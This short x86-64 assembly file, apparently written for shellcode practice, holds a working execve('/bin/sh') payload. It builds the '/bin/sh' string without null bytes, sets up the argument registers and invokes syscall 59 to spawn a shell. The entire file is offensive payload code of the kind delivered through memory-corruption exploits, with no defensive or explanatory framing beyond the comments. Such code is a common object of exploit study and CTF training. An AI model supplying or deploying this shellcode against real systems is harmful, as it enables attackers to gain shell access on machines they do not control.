;;
;; shell.S for shellcodes
;; by lenormf
;;

bits 64

global _start

_start:
	;; execve("/bin/sh", ["/bin/sh", 0], 0)
	mov rax, 0x68732f6e69622fff	;; rax = "\xFF/bin/sh"
	shr rax, 8			;; rax = "/bin/sh"
	push rax
	mov rdi, rsp
	xor rax, rax
	push rax
	mov rsi, rsp
	xor rdx, rdx
	mov al, 59			;; rax = 59 (execve)
	syscall
